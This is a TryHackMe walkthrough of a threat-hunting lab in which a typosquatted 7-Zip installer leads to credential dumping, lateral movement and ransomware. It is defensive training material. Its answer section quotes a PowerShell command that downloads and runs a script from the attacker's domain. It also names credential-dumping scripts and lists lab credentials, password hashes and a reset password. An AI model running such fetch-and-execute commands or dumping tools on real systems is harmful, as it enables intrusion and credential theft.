# TryHackMe-Hunt Me II: Typo Squatters

![Image](https://prod-files-secure.s3.us-west-2.amazonaws.com/0cfa02cd-92e7-492f-8163-1d853193c777/d101cb23-0571-4dae-bb0d-6f8f076897f0/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UN3I7X5Y%2F20250410%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250410T184019Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDMaCXVzLXdlc3QtMiJHMEUCIQCCpVkIF3uAuLvf8GEkm7XC14viv5V6zd4X2AYvsR1ApwIgYTT%2FphXgE7y90mFUEh1Jjznhxo3ZpzBBlzULCY7g4CwqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDGD6PBCswxCVcwmMvSrcA3AnC2%2FpoAPy7eNrIn%2BBikFmfKGYmOsZgbFi1FIow6JRL4IVf%2FNYdRkheWsEtBo5TU%2FiN85%2F3f%2F22rAyAlDyXO1XCOlh7PA0l0B0MSWLyMXE%2FTXYyq%2B2mv5QqqXS09uOrZIct7T4L4n3nkq6vULP7uLuY0%2BYgnhhEfHMd39L1itMkYzpMK9l9oUGUxkLyMitErndJqf5Kk1OHIua1lIAAfrhZtIguLJDzAKl5U09DRulI%2F61%2FMrC8ewo17RYID%2BiymuWIIlMRJPNNtmqh9LZIf%2FzgGFya5kHiLa1jdDZtsylFM8UvSX7kmS6jac2oBEVJsTxhPizu0Puou9%2FmI9scpk18owRhB%2BNrghI%2FEZVxmDoRUXTlxUoLrFXgA292DppPAxIIbDdg9gSkAuHFYwDptaqjufP77UvUgV6aUZa22lgyGhCxNC5kg7JTSDLRq4LODo%2B9X60yys302DVbyo8f3QeC%2Fdp%2FOr5S1DUzfePE685q3LoAgz0hyOkHMkEGUawHy1LSiutJ%2BrE54W8QE4k983fE2bKCCXTpFhif5T0l7XSSTFA8YJwfKEPMNfkH5FBSK884BGOpRQZtLg0RefJaOQGUWHmR9o9Wi50m0L8WRbZi3BlfssSSXEuWFI6MLef4L8GOqUBPK6btKKFK2nm85klXEbIulXkbd6TUhN1bfIpVOJUzw%2Fhwxfxj3nEoVXIU%2BL9Jc%2B55d02cbdY5kRSk2w6ch9tvD4%2FlP08TKqTyFqdj4AuCkHND7KNbwg9g%2FV5NUiwmVZV70Jtt987a7YC0AQSJ1eubVFL8ISqco8z6iO056WrUWbfXczRYQeSPPHMnoZlUn0wMHGYLAuuRMxtPI2t%2BwCIxqqsinJ%2F&X-Amz-Signature=0c87c223fb79020234c84196501af81accee3691842ce4f16dde0f8541ecbbee&X-Amz-SignedHeaders=host&x-id=GetObject)
## Scenario
# Scenario
Just working on a  typical day as a software engineer, Perry received an encrypted 7z archive from his boss containing a snippet of a source code that must be completed within the day. Realizing that his current workstation does not have an application that can unpack the file, he spins up his browser and starts to search for software that can aid in accessing the file. Without validating the resource, Perry immediately clicks the first search engine result and installs the application.
![Image](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/f556cb74ecd4a6fc10926b8fcbb9cff4.png)
Last September 26, 2023,
 one of the security analysts observed something unusual on the workstation owned by Perry based on the generated endpoint and network logs. Given this, your SOC lead has assigned you to conduct an in-depth investigation on this  workstation and assess the impact of the potential compromise.

## Investigation
I began searching for downloads from 7zipp[.]org and event_id 15 and found where the user downloaded the package.
 
![Image](https://prod-files-secure.s3.us-west-2.amazonaws.com/0cfa02cd-92e7-492f-8163-1d853193c777/63ec031c-c5ae-4b50-9eba-ff6fb0e32cf3/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UN3I7X5Y%2F20250410%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250410T184019Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDMaCXVzLXdlc3QtMiJHMEUCIQCCpVkIF3uAuLvf8GEkm7XC14viv5V6zd4X2AYvsR1ApwIgYTT%2FphXgE7y90mFUEh1Jjznhxo3ZpzBBlzULCY7g4CwqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDGD6PBCswxCVcwmMvSrcA3AnC2%2FpoAPy7eNrIn%2BBikFmfKGYmOsZgbFi1FIow6JRL4IVf%2FNYdRkheWsEtBo5TU%2FiN85%2F3f%2F22rAyAlDyXO1XCOlh7PA0l0B0MSWLyMXE%2FTXYyq%2B2mv5QqqXS09uOrZIct7T4L4n3nkq6vULP7uLuY0%2BYgnhhEfHMd39L1itMkYzpMK9l9oUGUxkLyMitErndJqf5Kk1OHIua1lIAAfrhZtIguLJDzAKl5U09DRulI%2F61%2FMrC8ewo17RYID%2BiymuWIIlMRJPNNtmqh9LZIf%2FzgGFya5kHiLa1jdDZtsylFM8UvSX7kmS6jac2oBEVJsTxhPizu0Puou9%2FmI9scpk18owRhB%2BNrghI%2FEZVxmDoRUXTlxUoLrFXgA292DppPAxIIbDdg9gSkAuHFYwDptaqjufP77UvUgV6aUZa22lgyGhCxNC5kg7JTSDLRq4LODo%2B9X60yys302DVbyo8f3QeC%2Fdp%2FOr5S1DUzfePE685q3LoAgz0hyOkHMkEGUawHy1LSiutJ%2BrE54W8QE4k983fE2bKCCXTpFhif5T0l7XSSTFA8YJwfKEPMNfkH5FBSK884BGOpRQZtLg0RefJaOQGUWHmR9o9Wi50m0L8WRbZi3BlfssSSXEuWFI6MLef4L8GOqUBPK6btKKFK2nm85klXEbIulXkbd6TUhN1bfIpVOJUzw%2Fhwxfxj3nEoVXIU%2BL9Jc%2B55d02cbdY5kRSk2w6ch9tvD4%2FlP08TKqTyFqdj4AuCkHND7KNbwg9g%2FV5NUiwmVZV70Jtt987a7YC0AQSJ1eubVFL8ISqco8z6iO056WrUWbfXczRYQeSPPHMnoZlUn0wMHGYLAuuRMxtPI2t%2BwCIxqqsinJ%2F&X-Amz-Signature=17272ba3c90bb19732fa1b32041015e68d64d95cce2fe0bf11fb821e47ee6642&X-Amz-SignedHeaders=host&x-id=GetObject)

Searching for dns events involving 7zipp[.]org revealed the IP address of the malicious domain
![Image](https://prod-files-secure.s3.us-west-2.amazonaws.com/0cfa02cd-92e7-492f-8163-1d853193c777/46a3464a-61d5-4785-a37f-c593c65acedd/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UN3I7X5Y%2F20250410%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250410T184019Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDMaCXVzLXdlc3QtMiJHMEUCIQCCpVkIF3uAuLvf8GEkm7XC14viv5V6zd4X2AYvsR1ApwIgYTT%2FphXgE7y90mFUEh1Jjznhxo3ZpzBBlzULCY7g4CwqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDGD6PBCswxCVcwmMvSrcA3AnC2%2FpoAPy7eNrIn%2BBikFmfKGYmOsZgbFi1FIow6JRL4IVf%2FNYdRkheWsEtBo5TU%2FiN85%2F3f%2F22rAyAlDyXO1XCOlh7PA0l0B0MSWLyMXE%2FTXYyq%2B2mv5QqqXS09uOrZIct7T4L4n3nkq6vULP7uLuY0%2BYgnhhEfHMd39L1itMkYzpMK9l9oUGUxkLyMitErndJqf5Kk1OHIua1lIAAfrhZtIguLJDzAKl5U09DRulI%2F61%2FMrC8ewo17RYID%2BiymuWIIlMRJPNNtmqh9LZIf%2FzgGFya5kHiLa1jdDZtsylFM8UvSX7kmS6jac2oBEVJsTxhPizu0Puou9%2FmI9scpk18owRhB%2BNrghI%2FEZVxmDoRUXTlxUoLrFXgA292DppPAxIIbDdg9gSkAuHFYwDptaqjufP77UvUgV6aUZa22lgyGhCxNC5kg7JTSDLRq4LODo%2B9X60yys302DVbyo8f3QeC%2Fdp%2FOr5S1DUzfePE685q3LoAgz0hyOkHMkEGUawHy1LSiutJ%2BrE54W8QE4k983fE2bKCCXTpFhif5T0l7XSSTFA8YJwfKEPMNfkH5FBSK884BGOpRQZtLg0RefJaOQGUWHmR9o9Wi50m0L8WRbZi3BlfssSSXEuWFI6MLef4L8GOqUBPK6btKKFK2nm85klXEbIulXkbd6TUhN1bfIpVOJUzw%2Fhwxfxj3nEoVXIU%2BL9Jc%2B55d02cbdY5kRSk2w6ch9tvD4%2FlP08TKqTyFqdj4AuCkHND7KNbwg9g%2FV5NUiwmVZV70Jtt987a7YC0AQSJ1eubVFL8ISqco8z6iO056WrUWbfXczRYQeSPPHMnoZlUn0wMHGYLAuuRMxtPI2t%2BwCIxqqsinJ%2F&X-Amz-Signature=ea266480f9544032f6cc4206d59a42b2d95f47bc188f879fd4ba8f145a138a69&X-Amz-SignedHeaders=host&x-id=GetObject)

Searching for the pid where the malicious software was executed by searching for the filename and event id 1 
![Image](https://prod-files-secure.s3.us-west-2.amazonaws.com/0cfa02cd-92e7-492f-8163-1d853193c777/587b5e65-f58b-4c65-940a-481f68edc3d2/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UN3I7X5Y%2F20250410%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250410T184019Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDMaCXVzLXdlc3QtMiJHMEUCIQCCpVkIF3uAuLvf8GEkm7XC14viv5V6zd4X2AYvsR1ApwIgYTT%2FphXgE7y90mFUEh1Jjznhxo3ZpzBBlzULCY7g4CwqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDGD6PBCswxCVcwmMvSrcA3AnC2%2FpoAPy7eNrIn%2BBikFmfKGYmOsZgbFi1FIow6JRL4IVf%2FNYdRkheWsEtBo5TU%2FiN85%2F3f%2F22rAyAlDyXO1XCOlh7PA0l0B0MSWLyMXE%2FTXYyq%2B2mv5QqqXS09uOrZIct7T4L4n3nkq6vULP7uLuY0%2BYgnhhEfHMd39L1itMkYzpMK9l9oUGUxkLyMitErndJqf5Kk1OHIua1lIAAfrhZtIguLJDzAKl5U09DRulI%2F61%2FMrC8ewo17RYID%2BiymuWIIlMRJPNNtmqh9LZIf%2FzgGFya5kHiLa1jdDZtsylFM8UvSX7kmS6jac2oBEVJsTxhPizu0Puou9%2FmI9scpk18owRhB%2BNrghI%2FEZVxmDoRUXTlxUoLrFXgA292DppPAxIIbDdg9gSkAuHFYwDptaqjufP77UvUgV6aUZa22lgyGhCxNC5kg7JTSDLRq4LODo%2B9X60yys302DVbyo8f3QeC%2Fdp%2FOr5S1DUzfePE685q3LoAgz0hyOkHMkEGUawHy1LSiutJ%2BrE54W8QE4k983fE2bKCCXTpFhif5T0l7XSSTFA8YJwfKEPMNfkH5FBSK884BGOpRQZtLg0RefJaOQGUWHmR9o9Wi50m0L8WRbZi3BlfssSSXEuWFI6MLef4L8GOqUBPK6btKKFK2nm85klXEbIulXkbd6TUhN1bfIpVOJUzw%2Fhwxfxj3nEoVXIU%2BL9Jc%2B55d02cbdY5kRSk2w6ch9tvD4%2FlP08TKqTyFqdj4AuCkHND7KNbwg9g%2FV5NUiwmVZV70Jtt987a7YC0AQSJ1eubVFL8ISqco8z6iO056WrUWbfXczRYQeSPPHMnoZlUn0wMHGYLAuuRMxtPI2t%2BwCIxqqsinJ%2F&X-Amz-Signature=b6e4233d01892377883760e42cae2d49d1e3271a4382ce6ad565aff5bc3fafb1&X-Amz-SignedHeaders=host&x-id=GetObject)

Following the execution chain, searching for event id 1 and the domain 7zipp[.]org, I was able to find the next step in the software process by looking for events after the execution time of 9/26/2023 @14:23.00.817
Below you can also see the new file that was downloaded and the service creation 
![Image](https://prod-files-secure.s3.us-west-2.amazonaws.com/0cfa02cd-92e7-492f-8163-1d853193c777/d3eeda77-9c78-4663-a9a3-38afd2137a0e/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UN3I7X5Y%2F20250410%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250410T184019Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDMaCXVzLXdlc3QtMiJHMEUCIQCCpVkIF3uAuLvf8GEkm7XC14viv5V6zd4X2AYvsR1ApwIgYTT%2FphXgE7y90mFUEh1Jjznhxo3ZpzBBlzULCY7g4CwqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDGD6PBCswxCVcwmMvSrcA3AnC2%2FpoAPy7eNrIn%2BBikFmfKGYmOsZgbFi1FIow6JRL4IVf%2FNYdRkheWsEtBo5TU%2FiN85%2F3f%2F22rAyAlDyXO1XCOlh7PA0l0B0MSWLyMXE%2FTXYyq%2B2mv5QqqXS09uOrZIct7T4L4n3nkq6vULP7uLuY0%2BYgnhhEfHMd39L1itMkYzpMK9l9oUGUxkLyMitErndJqf5Kk1OHIua1lIAAfrhZtIguLJDzAKl5U09DRulI%2F61%2FMrC8ewo17RYID%2BiymuWIIlMRJPNNtmqh9LZIf%2FzgGFya5kHiLa1jdDZtsylFM8UvSX7kmS6jac2oBEVJsTxhPizu0Puou9%2FmI9scpk18owRhB%2BNrghI%2FEZVxmDoRUXTlxUoLrFXgA292DppPAxIIbDdg9gSkAuHFYwDptaqjufP77UvUgV6aUZa22lgyGhCxNC5kg7JTSDLRq4LODo%2B9X60yys302DVbyo8f3QeC%2Fdp%2FOr5S1DUzfePE685q3LoAgz0hyOkHMkEGUawHy1LSiutJ%2BrE54W8QE4k983fE2bKCCXTpFhif5T0l7XSSTFA8YJwfKEPMNfkH5FBSK884BGOpRQZtLg0RefJaOQGUWHmR9o9Wi50m0L8WRbZi3BlfssSSXEuWFI6MLef4L8GOqUBPK6btKKFK2nm85klXEbIulXkbd6TUhN1bfIpVOJUzw%2Fhwxfxj3nEoVXIU%2BL9Jc%2B55d02cbdY5kRSk2w6ch9tvD4%2FlP08TKqTyFqdj4AuCkHND7KNbwg9g%2FV5NUiwmVZV70Jtt987a7YC0AQSJ1eubVFL8ISqco8z6iO056WrUWbfXczRYQeSPPHMnoZlUn0wMHGYLAuuRMxtPI2t%2BwCIxqqsinJ%2F&X-Amz-Signature=b828955ce31228fd4a225e86b2cf1d9aa49242412365335e83da9b1c5bac993a&X-Amz-SignedHeaders=host&x-id=GetObject)

Looking further into the new service that was created, we can see that it was created and executed by the SYSTEM user so the process has the highest level of privilege.
![Image](https://prod-files-secure.s3.us-west-2.amazonaws.com/0cfa02cd-92e7-492f-8163-1d853193c777/1ca40d07-b9af-4172-818b-eecb6ba2815b/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UN3I7X5Y%2F20250410%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250410T184019Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDMaCXVzLXdlc3QtMiJHMEUCIQCCpVkIF3uAuLvf8GEkm7XC14viv5V6zd4X2AYvsR1ApwIgYTT%2FphXgE7y90mFUEh1Jjznhxo3ZpzBBlzULCY7g4CwqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDGD6PBCswxCVcwmMvSrcA3AnC2%2FpoAPy7eNrIn%2BBikFmfKGYmOsZgbFi1FIow6JRL4IVf%2FNYdRkheWsEtBo5TU%2FiN85%2F3f%2F22rAyAlDyXO1XCOlh7PA0l0B0MSWLyMXE%2FTXYyq%2B2mv5QqqXS09uOrZIct7T4L4n3nkq6vULP7uLuY0%2BYgnhhEfHMd39L1itMkYzpMK9l9oUGUxkLyMitErndJqf5Kk1OHIua1lIAAfrhZtIguLJDzAKl5U09DRulI%2F61%2FMrC8ewo17RYID%2BiymuWIIlMRJPNNtmqh9LZIf%2FzgGFya5kHiLa1jdDZtsylFM8UvSX7kmS6jac2oBEVJsTxhPizu0Puou9%2FmI9scpk18owRhB%2BNrghI%2FEZVxmDoRUXTlxUoLrFXgA292DppPAxIIbDdg9gSkAuHFYwDptaqjufP77UvUgV6aUZa22lgyGhCxNC5kg7JTSDLRq4LODo%2B9X60yys302DVbyo8f3QeC%2Fdp%2FOr5S1DUzfePE685q3LoAgz0hyOkHMkEGUawHy1LSiutJ%2BrE54W8QE4k983fE2bKCCXTpFhif5T0l7XSSTFA8YJwfKEPMNfkH5FBSK884BGOpRQZtLg0RefJaOQGUWHmR9o9Wi50m0L8WRbZi3BlfssSSXEuWFI6MLef4L8GOqUBPK6btKKFK2nm85klXEbIulXkbd6TUhN1bfIpVOJUzw%2Fhwxfxj3nEoVXIU%2BL9Jc%2B55d02cbdY5kRSk2w6ch9tvD4%2FlP08TKqTyFqdj4AuCkHND7KNbwg9g%2FV5NUiwmVZV70Jtt987a7YC0AQSJ1eubVFL8ISqco8z6iO056WrUWbfXczRYQeSPPHMnoZlUn0wMHGYLAuuRMxtPI2t%2BwCIxqqsinJ%2F&X-Amz-Signature=7e62c4b30fb2810967c9d4f6b66f7f18d88853f49789a5c3746c1bc70354e94f&X-Amz-SignedHeaders=host&x-id=GetObject)

We can search for lsass.dmp to see what tool was used to parse the data extracted
![Image](https://prod-files-secure.s3.us-west-2.amazonaws.com/0cfa02cd-92e7-492f-8163-1d853193c777/8d34aa40-e852-4e1e-953d-ecf3ac77c664/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UN3I7X5Y%2F20250410%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250410T184019Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDMaCXVzLXdlc3QtMiJHMEUCIQCCpVkIF3uAuLvf8GEkm7XC14viv5V6zd4X2AYvsR1ApwIgYTT%2FphXgE7y90mFUEh1Jjznhxo3ZpzBBlzULCY7g4CwqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDGD6PBCswxCVcwmMvSrcA3AnC2%2FpoAPy7eNrIn%2BBikFmfKGYmOsZgbFi1FIow6JRL4IVf%2FNYdRkheWsEtBo5TU%2FiN85%2F3f%2F22rAyAlDyXO1XCOlh7PA0l0B0MSWLyMXE%2FTXYyq%2B2mv5QqqXS09uOrZIct7T4L4n3nkq6vULP7uLuY0%2BYgnhhEfHMd39L1itMkYzpMK9l9oUGUxkLyMitErndJqf5Kk1OHIua1lIAAfrhZtIguLJDzAKl5U09DRulI%2F61%2FMrC8ewo17RYID%2BiymuWIIlMRJPNNtmqh9LZIf%2FzgGFya5kHiLa1jdDZtsylFM8UvSX7kmS6jac2oBEVJsTxhPizu0Puou9%2FmI9scpk18owRhB%2BNrghI%2FEZVxmDoRUXTlxUoLrFXgA292DppPAxIIbDdg9gSkAuHFYwDptaqjufP77UvUgV6aUZa22lgyGhCxNC5kg7JTSDLRq4LODo%2B9X60yys302DVbyo8f3QeC%2Fdp%2FOr5S1DUzfePE685q3LoAgz0hyOkHMkEGUawHy1LSiutJ%2BrE54W8QE4k983fE2bKCCXTpFhif5T0l7XSSTFA8YJwfKEPMNfkH5FBSK884BGOpRQZtLg0RefJaOQGUWHmR9o9Wi50m0L8WRbZi3BlfssSSXEuWFI6MLef4L8GOqUBPK6btKKFK2nm85klXEbIulXkbd6TUhN1bfIpVOJUzw%2Fhwxfxj3nEoVXIU%2BL9Jc%2B55d02cbdY5kRSk2w6ch9tvD4%2FlP08TKqTyFqdj4AuCkHND7KNbwg9g%2FV5NUiwmVZV70Jtt987a7YC0AQSJ1eubVFL8ISqco8z6iO056WrUWbfXczRYQeSPPHMnoZlUn0wMHGYLAuuRMxtPI2t%2BwCIxqqsinJ%2F&X-Amz-Signature=33f40e72111f3d8b68acd043bcd3009fa1b075ffb343b5eea9da8935720c374f&X-Amz-SignedHeaders=host&x-id=GetObject)



## Questions
What is the URL of the malicious software that was downloaded by the victim user?
```javascript
http://www.7zipp.org/a/7z2301-x64.msi
```
What is the IP address of the domain hosting the malware?
```javascript
206.189.34.218
```
What is the PID of the process that executed the malicious software?
```javascript
2532
```
Following the execution chain of the malicious payload, another remote file was downloaded and executed. What is the full command line value of this suspicious activity?
```javascript
powershell.exe, iex(iwr, http://www.7zipp.org/a/7z.ps1, -useb)
```
The newly downloaded script also installed the legitimate version of the application. What is the full file path of the legitimate installer?
```javascript
C:\Windows\Temp\7zlegit.exe
```
What is the name of the service that was installed?
```javascript
7zService
```
The attacker was able to establish a C2 connection after starting the implanted service. What is the username of the account that executed the service?
```javascript
SYSTEM
```
After dumping LSASS data, the attacker attempted to parse the data to harvest the credentials. What is the name of the tool used by the attacker in this activity?
```powershell
Invoke-PowerExtract
```
What is the credential pair that the attacker leveraged after the credential dumping activity? (format: username:hash)
```javascript
james.cromwell:B852A0B8BD4E00564128E0A5EA2BC4CF
```
After gaining access to the new account, the attacker attempted to reset the credentials of another user. What is the new password set to this target account?
```javascript
pwn3dpw!!!
```
What is the name of the workstation where the new account was used?
```javascript
WKSTN-02
```
After gaining access to the new workstation, a new set of credentials was discovered. What is the username, including its domain, and password of this new account?
```javascript
SSF\itadmin:NoO6@39Sk0!
```
Aside from mimikatz, what is the name of the PowerShell script used to dump the hash of the domain admin?
```javascript
Invoke-SharpKatz.ps1
```
What is the AES256 hash of the domain admin based on the credential dumping output?
```javascript
f28a16b8d3f5163cb7a7f7ed2c8f2cf0419f0b0c2e28c15f831d050f5edaa534
```
After gaining domain admin access, the attacker popped ransomware on workstations. How many files were encrypted on all workstations?
```javascript
46
```


https://medium.com/@0x4C1D/try-hack-me-hunt-me-ii-typo-squatters-walkthrough-8da58af050d0
